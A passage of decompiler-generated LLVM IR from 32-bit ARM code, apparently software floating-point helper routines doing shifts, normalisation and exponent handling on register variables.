  %v3_14d3c = add i32 %v2_14d3c, %v0_14d3c
  %v1_14d40 = load i32, i32* @r2, align 4
  %v7_14d40 = shl i32 %v1_14d40, %v1_14d2c
  %v8_14d40 = add i32 %v7_14d40, %v8_14d38
  store i32 %v8_14d40, i32* %r1.global-to-local, align 4
  %v5_14d44 = and i32 %v1_14d40, %v4_14d38
  %v6_14d44 = icmp ne i32 %v5_14d44, 0
  %v7_14d44 = ashr i32 %v1_14d40, %v0_14d2c
  %v9_14d44 = add i32 %v3_14d3c, %v7_14d44
  %v10_14d44 = zext i1 %v6_14d44 to i32
  %v11_14d44 = add i32 %v10_14d44, %v9_14d44
  br label %dec_label_pc_14d68

dec_label_pc_14d4c:                               ; preds = %dec_label_pc_14d28
  %v1_14d4c = add i32 %v0_14d2c, -32
  %v1_14d50 = add i32 %v1_14d2c, 32
  %v0_14d58 = load i32, i32* @r2, align 4
  %v2_14d58 = add i32 %v1_14d2c, 31
  %v3_14d58 = lshr i32 -2147483648, %v2_14d58
  %v4_14d58 = and i32 %v0_14d58, %v3_14d58
  %v5_14d58 = icmp ne i32 %v4_14d58, 0
  %v6_14d58 = shl i32 %v0_14d58, %v1_14d50
  %v2_14d5c = or i32 %v6_14d58, 2
  %v2_14d5c.v6_14d58 = select i1 %v5_14d58, i32 %v2_14d5c, i32 %v6_14d58
  store i32 %v2_14d5c.v6_14d58, i32* %ip.global-to-local, align 4
  %v0_14d60 = load i32, i32* @r1, align 4
  %v7_14d60 = ashr i32 %v0_14d58, %v1_14d4c
  %v8_14d60 = add i32 %v0_14d60, %v7_14d60
  store i32 %v8_14d60, i32* %r1.global-to-local, align 4
  %v0_14d64 = load i32, i32* @r0, align 4
  %v2_14d64 = and i32 %v0_14d58, 1073741824
  %v3_14d64 = icmp ne i32 %v2_14d64, 0
  %v4_14d64 = ashr i32 %v0_14d58, 31
  %v6_14d64 = add i32 %v0_14d64, %v4_14d64
  %v7_14d64 = zext i1 %v3_14d64 to i32
  %v8_14d64 = add i32 %v6_14d64, %v7_14d64
  br label %dec_label_pc_14d68

dec_label_pc_14d68:                               ; preds = %dec_label_pc_14d34, %dec_label_pc_14d4c
  %storemerge = phi i32 [ %v11_14d44, %dec_label_pc_14d34 ], [ %v8_14d64, %dec_label_pc_14d4c ]
  %v0_14d68 = phi i32 [ %v11_14d44, %dec_label_pc_14d34 ], [ %v8_14d64, %dec_label_pc_14d4c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_14d68 = and i32 %v0_14d68, -2147483648
  store i32 %v1_14d68, i32* @r5, align 4
  %v1_14d6c = icmp sgt i32 %v0_14d68, -1
  call void @__pseudo_cond_branch(i1 %v1_14d6c, i32 ptrtoint (i32* @global_var_14d7c.619 to i32))
  %v0_14d70 = load i32, i32* %ip.global-to-local, align 4
  %v1_14d70 = sub i32 0, %v0_14d70
  store i32 %v1_14d70, i32* %ip.global-to-local, align 4
  %v2_14d70 = icmp eq i32 %v0_14d70, 0
  %v0_14d74 = load i32, i32* %r1.global-to-local, align 4
  %v2_14d74 = icmp eq i1 %v2_14d70, false
  %v5_14d74 = sext i1 %v2_14d74 to i32
  %v6_14d74 = sub i32 %v5_14d74, %v0_14d74
  store i32 %v6_14d74, i32* @r1, align 4
  %v7_14d74 = zext i1 %v2_14d74 to i32
  %v8_14d74 = icmp ne i32 %v6_14d74, %v7_14d74
  %v9_14d74 = icmp ne i32 %v0_14d74, -1
  %v10_14d74 = or i1 %v9_14d74, %v8_14d74
  %v11_14d74 = icmp ne i32 %v0_14d74, 0
  %v12_14d74 = select i1 %v2_14d74, i1 %v10_14d74, i1 %v11_14d74
  %v0_14d78 = load i32, i32* %r0.global-to-local, align 4
  %v5_14d78 = sext i1 %v12_14d74 to i32
  %v6_14d78 = sub i32 %v5_14d78, %v0_14d78
  store i32 %v6_14d78, i32* %r0.global-to-local, align 4
  ret i32 %v6_14d78

; uselistorder directives
  uselistorder i1 %v2_14d74, { 1, 2, 0 }
  uselistorder i32 %v0_14d74, { 1, 2, 0 }
  uselistorder i32 %v8_14d64, { 1, 0 }
  uselistorder i32 %v0_14d58, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_14d44, { 1, 0 }
  uselistorder i32 %v1_14d40, { 1, 0, 2 }
  uselistorder i32 %v0_14d38, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_14d68, { 1, 0 }
}

define i32 @function_14d7c(i32 %arg1, i64 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_14d7c:
  %r0.global-to-local = alloca i32, align 4
  %tmp = trunc i64 %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_14d80 = icmp ult i32 %arg1, 1048574
  br i1 %v3_14d80, label %dec_label_pc_14dc0, label %dec_label_pc_14d84

dec_label_pc_14d84:                               ; preds = %dec_label_pc_14d7c
  %v3_14d88 = icmp ult i32 %arg1, 2097150
  br i1 %v3_14d88, label %dec_label_pc_14da8, label %dec_label_pc_14d8c

dec_label_pc_14d8c:                               ; preds = %dec_label_pc_14d84
  %v1_14d8c = urem i32 %arg1, 2
  %v2_14d8c = icmp ne i32 %v1_14d8c, 0
  %v3_14d8c = udiv i32 %arg1, 2
  store i32 %v3_14d8c, i32* %r0.global-to-local, align 4
  %v0_14d90 = load i32, i32* @r1, align 4
  %v3_14d90 = zext i1 %v2_14d8c to i32
  %v6_14d90 = zext i32 %v0_14d90 to i64
  %v7_14d90 = sub i32 33, %v0_14d90
  %v8_14d90 = zext i32 %v7_14d90 to i64
  %v9_14d90 = shl i64 %v6_14d90, %v8_14d90
  %v10_14d90 = sub i32 32, %v0_14d90
  %v11_14d90 = shl i32 %v3_14d90, %v10_14d90
  %v12_14d90 = zext i32 %v11_14d90 to i64
  %v14_14d90 = or i64 %v12_14d90, %v9_14d90
  %v15_14d90 = trunc i64 %v14_14d90 to i32
  %v16_14d90 = add i32 %v0_14d90, -1
  %v17_14d90 = shl i32 1, %v16_14d90
  %v18_14d90 = and i32 %v17_14d90, %v0_14d90
  %v19_14d90 = icmp ne i32 %v18_14d90, 0
  store i32 %v15_14d90, i32* @r1, align 4
  %v0_14d94 = load i32, i32* @ip, align 4
  %v3_14d94 = zext i1 %v19_14d90 to i32
  %v6_14d94 = zext i32 %v0_14d94 to i64
  %v7_14d94 = sub i32 33, %v0_14d94
  %v8_14d94 = zext i32 %v7_14d94 to i64
  %v9_14d94 = shl i64 %v6_14d94, %v8_14d94
  %v10_14d94 = sub i32 32, %v0_14d94
  %v11_14d94 = shl i32 %v3_14d94, %v10_14d94
  %v12_14d94 = zext i32 %v11_14d94 to i64
  %v14_14d94 = or i64 %v12_14d94, %v9_14d94
  %v15_14d94 = trunc i64 %v14_14d94 to i32
  store i32 %v15_14d94, i32* @ip, align 4
  %v0_14d98 = load i32, i32* @r4, align 4
  %v1_14d98 = add i32 %v0_14d98, 1
  store i32 %v1_14d98, i32* @r4, align 4
  %v3_14d9c = mul i32 %v1_14d98, 2097152
  %v2_14da0 = icmp ugt i32 %v3_14d9c, -4194305
  call void @__pseudo_cond_branch(i1 %v2_14da0, i32 ptrtoint (i32* @global_var_14f34.620 to i32))
  br label %dec_label_pc_14da8

dec_label_pc_14da8:                               ; preds = %dec_label_pc_14dc0, %dec_label_pc_14d84, %dec_label_pc_14d8c
  %v0_14da8 = load i32, i32* @ip, align 4
  %v2_14da8 = icmp slt i32 %v0_14da8, 0
  %v6_14da8 = icmp eq i32 %v0_14da8, -2147483648
  %v1_14dac = load i32, i32* @r1, align 4
  br i1 %v6_14da8, label %bb, label %dec_label_pc_14da8._crit_edge

bb:                                               ; preds = %dec_label_pc_14da8
  %v2_14dac = urem i32 %v1_14dac, 2
  %v3_14dac = icmp ne i32 %v2_14dac, 0
  br label %dec_label_pc_14da8._crit_edge

dec_label_pc_14da8._crit_edge:                    ; preds = %dec_label_pc_14da8, %bb
  %v1_14db0 = phi i1 [ %v3_14dac, %bb ], [ %v2_14da8, %dec_label_pc_14da8 ]
  %v2_14db0 = zext i1 %v1_14db0 to i32
  %v3_14db0 = add i32 %v2_14db0, %v1_14dac
  store i32 %v3_14db0, i32* @r1, align 4
  %v0_14db4 = load i32, i32* %r0.global-to-local, align 4
  %v1_14db4 = load i32, i32* @r4, align 4
  %v2_14db4 = and i32 %v1_14db4, 4096
  %v3_14db4 = icmp ne i32 %v2_14db4, 0
  %v4_14db4 = mul i32 %v1_14db4, 1048576
  %v6_14db4 = add i32 %v4_14db4, %v0_14db4
  %v7_14db4 = zext i1 %v3_14db4 to i32
  %v8_14db4 = add i32 %v7_14db4, %v6_14db4
  %v1_14db8 = load i32, i32* @r5, align 4
  %v2_14db8 = or i32 %v1_14db8, %v8_14db4
  store i32 %v2_14db8, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  ret i32 %v2_14db8

dec_label_pc_14dc0:                               ; preds = %dec_label_pc_14d7c
  %v0_14dc0 = load i32, i32* @ip, align 4
  %v1_14dc0 = icmp slt i32 %v0_14dc0, 0
  %v2_14dc0 = mul i32 %v0_14dc0, 2
  store i32 %v2_14dc0, i32* @ip, align 4
  %v0_14dc4 = load i32, i32* @r1, align 4
  %v3_14dc4 = mul i32 %v0_14dc4, 2
  %v4_14dc4 = zext i1 %v1_14dc0 to i32
  %v5_14dc4 = or i32 %v3_14dc4, %v4_14dc4
  store i32 %v5_14dc4, i32* @r1, align 4
  %v9_14dc4 = icmp ule i32 %v5_14dc4, %v0_14dc4
  %v10_14dc4 = icmp ult i32 %v3_14dc4, %v0_14dc4
  %v11_14dc4 = select i1 %v1_14dc0, i1 %v9_14dc4, i1 %v10_14dc4
  %v3_14dc8 = mul i32 %arg1, 2
  %v4_14dc8 = zext i1 %v11_14dc4 to i32
  %v5_14dc8 = or i32 %v4_14dc8, %v3_14dc8
  store i32 %v5_14dc8, i32* %r0.global-to-local, align 4
  %v1_14dcc = and i32 %v3_14dc8, 1048576
  %v2_14dcc = icmp eq i32 %v1_14dcc, 0
  %v0_14dd0 = load i32, i32* @r4, align 4
  %v1_14dd0 = add i32 %v0_14dd0, -1
  store i32 %v1_14dd0, i32* @r4, align 4
  br i1 %v2_14dcc, label %bb7, label %dec_label_pc_14da8

bb7:                                              ; preds = %dec_label_pc_14dc0
  ret i32 %v5_14dc8

; uselistorder directives
  uselistorder i32 %v0_14dc4, { 1, 2, 0 }
  uselistorder i1 %v1_14dc0, { 1, 0 }
  uselistorder i32 %v1_14dac, { 1, 0 }
  uselistorder i32 %v0_14da8, { 1, 0 }
  uselistorder i32 %v0_14d94, { 1, 0, 2 }
  uselistorder i32 %v0_14d90, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg1, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_14da8._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_14da8, { 0, 2, 1 }
}

define i32 @function_14dd8(i32 %arg1) local_unnamed_addr {
dec_label_pc_14dd8:
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %v2_14dd8 = icmp eq i32 %arg1, 0
  br i1 %v2_14dd8, label %bb35, label %bb

bb:                                               ; preds = %dec_label_pc_14dd8
  br label %.thread

bb35:                                             ; preds = %dec_label_pc_14dd8
  %v1_14de410 = load i32, i32* @r1, align 4
  store i32 0, i32* @r1, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb35
  %v0_14e40 = phi i32 [ %arg1, %bb ], [ %v1_14de410, %bb35 ]
  %v1_14df8 = phi i32 [ 20, %bb ], [ 52, %bb35 ]
  %v2_14df0 = icmp ugt i32 %v0_14e40, 65535
  br i1 %v2_14df0, label %bb36, label %.thread3

bb36:                                             ; preds = %.thread
  %v2_14df4 = and i32 %v0_14e40, 32768
  %v3_14df4 = icmp eq i32 %v2_14df4, 0
  %v4_14df4 = udiv i32 %v0_14e40, 65536
  br i1 %v3_14df4, label %.thread3, label %bb37

bb37:                                             ; preds = %bb36
  %v2_14df8 = add nsw i32 %v1_14df8, -16
  br label %.thread3

.thread3:                                         ; preds = %bb36, %.thread, %bb37
  %v1_14e04 = phi i32 [ %v1_14df8, %.thread ], [ %v1_14df8, %bb36 ], [ %v2_14df8, %bb37 ]
  %v1_14e00 = phi i32 [ %v0_14e40, %.thread ], [ %v4_14df4, %bb36 ], [ %v4_14df4, %bb37 ]
  %v2_14dfc = icmp ugt i32 %v1_14e00, 255
  br i1 %v2_14dfc, label %bb38, label %.thread4

bb38:                                             ; preds = %.thread3
  %v2_14e00 = and i32 %v1_14e00, 128
  %v3_14e00 = icmp eq i32 %v2_14e00, 0
  %v4_14e00 = udiv i32 %v1_14e00, 256
  br i1 %v3_14e00, label %.thread4, label %bb39

bb39:                                             ; preds = %bb38
  %v2_14e04 = add nsw i32 %v1_14e04, -8
  br label %.thread4

.thread4:                                         ; preds = %bb38, %.thread3, %bb39
  %v1_14e10 = phi i32 [ %v1_14e04, %.thread3 ], [ %v1_14e04, %bb38 ], [ %v2_14e04, %bb39 ]
  %v1_14e0c = phi i32 [ %v1_14e00, %.thread3 ], [ %v4_14e00, %bb38 ], [ %v4_14e00, %bb39 ]
  %v2_14e08 = icmp ugt i32 %v1_14e0c, 15
  br i1 %v2_14e08, label %bb40, label %.thread5

bb40:                                             ; preds = %.thread4
  %v2_14e0c = and i32 %v1_14e0c, 8
  %v3_14e0c = icmp eq i32 %v2_14e0c, 0
  %v4_14e0c = udiv i32 %v1_14e0c, 16
  br i1 %v3_14e0c, label %.thread5, label %bb41

bb41:                                             ; preds = %bb40
  %v2_14e10 = add nsw i32 %v1_14e10, -4
  br label %.thread5

.thread5:                                         ; preds = %bb40, %.thread4, %bb41
  %v1_14e18 = phi i32 [ %v1_14e10, %.thread4 ], [ %v1_14e10, %bb40 ], [ %v2_14e10, %bb41 ]
  %v1_14e20 = phi i32 [ %v1_14e0c, %.thread4 ], [ %v4_14e0c, %bb40 ], [ %v4_14e0c, %bb41 ]
  %v2_14e14 = icmp ugt i32 %v1_14e20, 3
  br i1 %v2_14e14, label %bb42, label %.thread6

bb42:                                             ; preds = %.thread5
  %v2_14e18 = add i32 %v1_14e18, -2
  br label %bb43

.thread6:                                         ; preds = %.thread5
  %v5_14e1c = udiv i32 %v1_14e20, 2
  %v6_14e1c = sub i32 %v1_14e18, %v5_14e1c
  br label %bb43

bb43:                                             ; preds = %bb42, %.thread6
  %v0_14e20 = phi i32 [ %v6_14e1c, %.thread6 ], [ %v2_14e18, %bb42 ]
  %v4_14e20 = udiv i32 %v1_14e20, 8
  %v5_14e20 = sub i32 %v0_14e20, %v4_14e20
  %v2_14e24 = add i32 %v5_14e20, -32
  %v4_14e24 = sub i32 31, %v5_14e20
  %v5_14e24 = and i32 %v4_14e24, %v5_14e20
  %v8_14e24 = icmp eq i32 %v5_14e20, 32
  %v6_14e28 = icmp slt i32 %v5_14e20, 32
  br i1 %v6_14e28, label %dec_label_pc_14e2c, label %dec_label_pc_14e4c

dec_label_pc_14e2c:                               ; preds = %bb43
  %v2_14e2c = add i32 %v5_14e20, -20
  %v7_14e30 = icmp sgt i32 %v2_14e24, -12
  br i1 %v7_14e30, label %dec_label_pc_14e34, label %dec_label_pc_14e48

dec_label_pc_14e34:                               ; preds = %dec_label_pc_14e2c
  store i32 %v5_14e20, i32* @ip, align 4
  %v1_14e38 = sub i32 32, %v5_14e20
  %v6_14e3c = shl i32 %v0_14e40, %v5_14e20
  store i32 %v6_14e3c, i32* @r1, align 4
  %v6_14e40 = lshr i32 %v0_14e40, %v1_14e38
  br label %.thread31

dec_label_pc_14e48:                               ; preds = %dec_label_pc_14e2c
  %v8_14e2c = icmp eq i32 %v2_14e2c, 0
  %v4_14e2c = add i32 %v5_14e20, 2147483616
  %v5_14e2c = and i32 %v2_14e2c, %v4_14e2c
  br label %dec_label_pc_14e4c

dec_label_pc_14e4c:                               ; preds = %bb43, %dec_label_pc_14e48
  %v1_14e58.in = phi i32 [ %v2_14e24, %bb43 ], [ %v2_14e2c, %dec_label_pc_14e48 ]
  %v6_14e58 = phi i32 [ %v2_14e24, %bb43 ], [ %v5_14e20, %dec_label_pc_14e48 ]
  %v2_14e58.in = phi i32 [ %v5_14e24, %bb43 ], [ %v5_14e2c, %dec_label_pc_14e48 ]
  %v0_14e58 = phi i1 [ %v8_14e24, %bb43 ], [ %v8_14e2c, %dec_label_pc_14e48 ]
  %v1_14e58 = icmp slt i32 %v1_14e58.in, 0
  %v2_14e58 = icmp slt i32 %v2_14e58.in, 0
  %v3_14e4c = xor i1 %v2_14e58, %v1_14e58
  %v4_14e4c = or i1 %v0_14e58, %v3_14e4c
  br i1 %v4_14e4c, label %bb44, label %bb45

bb44:                                             ; preds = %dec_label_pc_14e4c
  %v6_14e4c = sub i32 32, %v6_14e58
  store i32 %v6_14e4c, i32* @ip, align 4
  br label %bb45

bb45:                                             ; preds = %dec_label_pc_14e4c, %bb44
  %v6_14e50 = shl i32 %v0_14e40, %v6_14e58
  br i1 %v4_14e4c, label %bb46, label %.thread31

bb46:                                             ; preds = %bb45
  %v6_14e54 = load i32, i32* @r1, align 4
  %v7_14e54 = load i32, i32* @ip, align 4
  %v12_14e54 = lshr i32 %v6_14e54, %v7_14e54
  %v13_14e54 = or i32 %v12_14e54, %v6_14e50
  %v11_14e58 = shl i32 %v6_14e54, %v6_14e58
  store i32 %v11_14e58, i32* @r1, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb45, %dec_label_pc_14e34, %bb46
  %v1_14ea4 = phi i32 [ %v6_14e40, %dec_label_pc_14e34 ], [ %v13_14e54, %bb46 ], [ %v6_14e50, %bb45 ]
  %v0_14e5c = load i32, i32* @r4, align 4
  %v2_14e5c = sub i32 %v0_14e5c, %v5_14e20
  %v5_14e60 = icmp slt i32 %v0_14e5c, %v5_14e20
  br i1 %v5_14e60, label %bb48, label %bb47

bb47:                                             ; preds = %.thread31
  %v10_14e60 = mul i32 %v2_14e5c, 1048576
  %v11_14e60 = add i32 %v10_14e60, %v1_14ea4
  %v7_14e64 = load i32, i32* @r5, align 4
  %v8_14e64 = or i32 %v7_14e64, %v11_14e60
  store i32 %tmp33, i32* @r4, align 4
  store i32 %tmp32, i32* @r5, align 4
  ret i32 %v8_14e64

bb48:                                             ; preds = %.thread31
  %v2_14e70 = sub i32 -32, %v2_14e5c
  %v6_14e74 = icmp sgt i32 %v2_14e5c, -32
  br i1 %v6_14e74, label %dec_label_pc_14e78, label %dec_label_pc_14eb0

dec_label_pc_14e78:                               ; preds = %bb48
  %v1_14e78 = add i32 %v2_14e70, 12
  %v8_14e7c = icmp sgt i32 %v1_14e78, 0
  br i1 %v8_14e7c, label %dec_label_pc_14e98, label %dec_label_pc_14e80

dec_label_pc_14e80:                               ; preds = %dec_label_pc_14e78
  %v1_14e80 = add i32 %v2_14e70, 32
  %v1_14e84 = sub i32 0, %v2_14e70
  %v0_14e88 = load i32, i32* @r1, align 4
  %v6_14e88 = lshr i32 %v0_14e88, %v1_14e80
  %v7_14e8c = shl i32 %v1_14ea4, %v1_14e84
  %v8_14e8c = or i32 %v6_14e88, %v7_14e8c
  store i32 %v8_14e8c, i32* @r1, align 4
  %v0_14e90 = load i32, i32* @r5, align 4
  %v7_14e90 = lshr i32 %v1_14ea4, %v1_14e80
  %v8_14e90 = or i32 %v0_14e90, %v7_14e90
  store i32 %tmp33, i32* @r4, align 4
  store i32 %tmp32, i32* @r5, align 4
  ret i32 %v8_14e90

dec_label_pc_14e98:                               ; preds = %dec_label_pc_14e78
  %v1_14e98 = sub i32 0, %v2_14e70
  %v1_14e9c = add i32 %v2_14e70, 32
  %v0_14ea0 = load i32, i32* @r1, align 4
  %v6_14ea0 = lshr i32 %v0_14ea0, %v1_14e9c
  %v7_14ea4 = shl i32 %v1_14ea4, %v1_14e98
  %v8_14ea4 = or i32 %v6_14ea0, %v7_14ea4
  store i32 %v8_14ea4, i32* @r1, align 4
  %v0_14ea8 = load i32, i32* @r5, align 4
  store i32 %tmp33, i32* @r4, align 4
  store i32 %tmp32, i32* @r5, align 4
  ret i32 %v0_14ea8

dec_label_pc_14eb0:                               ; preds = %bb48
  %v6_14eb0 = lshr i32 %v1_14ea4, %v2_14e70
  store i32 %v6_14eb0, i32* @r1, align 4
  %v0_14eb4 = load i32, i32* @r5, align 4
  store i32 %tmp33, i32* @r4, align 4
  store i32 %tmp32, i32* @r5, align 4
  ret i32 %v0_14eb4

; uselistorder directives
  uselistorder i32 %v2_14e70, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v2_14e5c, { 1, 0, 2 }
  uselistorder i32 %v1_14ea4, { 4, 1, 2, 3, 0 }
  uselistorder i32 %v6_14e50, { 1, 0 }
  uselistorder i32 %v2_14e24, { 1, 0, 2 }
  uselistorder i32 %v5_14e20, { 5, 4, 6, 2, 8, 1, 7, 3, 9, 10, 0, 12, 11 }
  uselistorder i32 %v4_14e0c, { 1, 0 }
  uselistorder i32 %v1_14e0c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14e00, { 1, 0 }
  uselistorder i32 %v1_14e00, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14df4, { 1, 0 }
  uselistorder i32 %v0_14e40, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32 %tmp33, { 3, 2, 1, 0 }
  uselistorder i32 %tmp32, { 3, 2, 1, 0 }
  uselistorder i32 -12, { 0, 1, 13, 14, 2, 16, 17, 3, 18, 19, 15, 12, 11, 10, 9, 8, 20, 21, 22, 4, 5, 6, 23, 7, 24, 25, 26, 27, 28, 29 }
  uselistorder i32 -20, { 0, 2, 1 }
  uselistorder i32 -2, { 14, 3, 5, 6, 4, 15, 7, 11, 8, 0, 13, 12, 16, 1, 9, 2, 10, 17, 18 }
  uselistorder i32 15, { 3, 4, 5, 1, 6, 2, 0 }
  uselistorder i32 -8, { 16, 17, 18, 19, 20, 21, 22, 15, 14, 6, 13, 12, 11, 10, 23, 24, 25, 26, 7, 27, 28, 2, 0, 31, 9, 29, 30, 1, 33, 34, 3, 8, 4, 5, 32 }
  uselistorder i32 128, { 14, 13, 12, 6, 7, 9, 5, 21, 0, 22, 23, 1, 8, 10, 16, 17, 18, 2, 3, 11, 19, 20, 4, 15 }
  uselistorder i32 255, { 7, 8, 9, 12, 3, 10, 0, 1, 13, 4, 5, 6, 11, 2 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 6, 5, 4, 1, 17, 18, 19, 20, 21, 22, 3, 2, 0, 23 }
  uselistorder i32 65535, { 3, 4, 5, 1, 0, 2 }
  uselistorder i32 52, { 0, 7, 5, 8, 4, 3, 9, 10, 2, 1, 6 }
  uselistorder i32 20, { 3, 22, 23, 24, 32, 0, 25, 35, 4, 36, 1, 5, 33, 8, 26, 27, 17, 9, 19, 2, 10, 28, 29, 30, 31, 18, 34, 11, 20, 12, 7, 6, 13, 21, 14, 15, 16 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_14e4c, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_14ebc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_14ebc:
  store i32 %arg4, i32* @r3, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_14ebc = load i32, i32* @r4, align 4
  %v2_14ebc = icmp eq i32 %v0_14ebc, 0
  %v1_14ec0 = xor i32 %arg3, 1048576
  store i32 %v1_14ec0, i32* @r2, align 4
  br i1 %v2_14ebc, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_14ebc
  %v2_14ec4 = xor i32 %arg1, 1048576
  store i32 %v2_14ec4, i32* @r0, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_14ebc
  %v1_14ecc = load i32, i32* @r5, align 4
  %v2_14ecc = add i32 %v1_14ecc, -1
  store i32 %v2_14ecc, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_14ed0 = call i32 @function_14d28()
  %v0_14ed4 = load i32, i32* @r4, align 4
  %v0_14ed4.off = add i32 %v0_14ed4, 4194303
  %tmp = icmp ult i32 %v0_14ed4.off, 2097152
  %v1_14f50 = load i32, i32* @r5, align 4
  %v1_14f50.off = add i32 %v1_14f50, 4194303
  %tmp45 = icmp ult i32 %v1_14f50.off, 2097152
  br i1 %tmp, label %.thread11, label %bb33

bb33:                                             ; preds = %bb
  br i1 %tmp45, label %bb40, label %dec_label_pc_14ee0

dec_label_pc_14ee0:                               ; preds = %bb33
  %v4_14ee0 = icmp eq i32 %v1_14f50, %v0_14ed4
  %v1_14ee4 = load i32, i32* @r1, align 4
  br i1 %v4_14ee0, label %bb34, label %dec_label_pc_14eec

bb34:                                             ; preds = %dec_label_pc_14ee0
  %v2_14ee4 = load i32, i32* @r3, align 4
  %v5_14ee4 = icmp eq i32 %v2_14ee4, %v1_14ee4
  br i1 %v5_14ee4, label %dec_label_pc_14efc, label %dec_label_pc_14eec

dec_label_pc_14eec:                               ; preds = %dec_label_pc_14ee0, %bb34
  %v2_14eec = or i32 %v1_14ee4, %v0_14ed4
  %v4_14eec = icmp eq i32 %v2_14eec, 0
  br i1 %v4_14eec, label %bb35, label %.thread6

bb35:                                             ; preds = %dec_label_pc_14eec
  %v1_14ef0 = load i32, i32* @r2, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_14eec, %bb35
  %v11_14ef8 = phi i32 [ %v0_14ed0, %dec_label_pc_14eec ], [ %v1_14ef0, %bb35 ]
  ret i32 %v11_14ef8

dec_label_pc_14efc:                               ; preds = %bb34
  %v1_14efc = load i32, i32* @r2, align 4
  %v4_14efc = icmp eq i32 %v1_14efc, %v0_14ed0
  br i1 %v4_14efc, label %.thread8, label %bb36

bb36:                                             ; preds = %dec_label_pc_14efc
  ret i32 0

.thread8:                                         ; preds = %dec_label_pc_14efc
  %tmp46 = icmp ult i32 %v0_14ed4, 2097152
  br i1 %tmp46, label %dec_label_pc_14f14, label %dec_label_pc_14f24

dec_label_pc_14f14:                               ; preds = %.thread8
  %v1_14f14 = icmp slt i32 %v1_14ee4, 0
  %v3_14f18 = mul i32 %v0_14ed0, 2
  %v4_14f18 = zext i1 %v1_14f14 to i32
  %v5_14f18 = or i32 %v4_14f18, %v3_14f18
  %v9_14f18 = icmp ule i32 %v5_14f18, %v0_14ed0
  %v10_14f18 = icmp ult i32 %v3_14f18, %v0_14ed0
  %v11_14f18 = select i1 %v1_14f14, i1 %v9_14f18, i1 %v10_14f18
  br i1 %v11_14f18, label %bb37, label %bb38

bb37:                                             ; preds = %dec_label_pc_14f14
  %v2_14f1c = or i32 %v5_14f18, -2147483648
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_14f14, %bb37
  %v11_14f20 = phi i32 [ %v5_14f18, %dec_label_pc_14f14 ], [ %v2_14f1c, %bb37 ]
  ret i32 %v11_14f20

dec_label_pc_14f24:                               ; preds = %.thread8
  %v2_14f24 = icmp ugt i32 %v0_14ed4, -4194305
  br i1 %v2_14f24, label %.thread9, label %bb39

bb39:                                             ; preds = %dec_label_pc_14f24
  %v2_14f28 = add i32 %v0_14ed0, 1048576
  ret i32 %v2_14f28

.thread9:                                         ; preds = %dec_label_pc_14f24
  %v1_14f30 = and i32 %v0_14ed0, -2147483648
  %v1_14f38 = or i32 %v1_14f30, 2146435072
  ret i32 %v1_14f38

.thread11:                                        ; preds = %bb
  br i1 %tmp45, label %.thread11..thread13_crit_edge, label %.thread14

.thread11..thread13_crit_edge:                    ; preds = %.thread11
  %v0_14f5c.pre = load i32, i32* @r1, align 4
  br label %.thread13

.thread14:                                        ; preds = %.thread11
  store i32 %v0_14ed0, i32* @r2, align 4
  br label %bb41

bb40:                                             ; preds = %bb33
  %v1_14f48 = load i32, i32* @r2, align 4
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread14
  %v1_14f5c27 = phi i32 [ %v0_14ed0, %.thread14 ], [ %v1_14f48, %bb40 ]
  %v1_14f58.in = phi i32* [ @r1, %.thread14 ], [ @r3, %bb40 ]
  %v1_14f58 = load i32, i32* %v1_14f58.in, align 4
  store i32 %v1_14f58, i32* @r3, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11..thread13_crit_edge, %bb41
  %v1_14f68 = phi i32 [ %v0_14ed0, %.thread11..thread13_crit_edge ], [ %v1_14f5c27, %bb41 ]
  %v0_14f5c = phi i32 [ %v0_14f5c.pre, %.thread11..thread13_crit_edge ], [ %v1_14f58, %bb41 ]
  %v4_14f5c = mul i32 %v1_14f68, 4096
  %v5_14f5c = or i32 %v4_14f5c, %v0_14f5c
  %v7_14f5c = icmp eq i32 %v5_14f5c, 0
  br i1 %v7_14f5c, label %bb42, label %.thread17

bb42:                                             ; preds = %.thread13
  %v1_14f60 = load i32, i32* @r3, align 4
  %v2_14f60 = load i32, i32* @r2, align 4
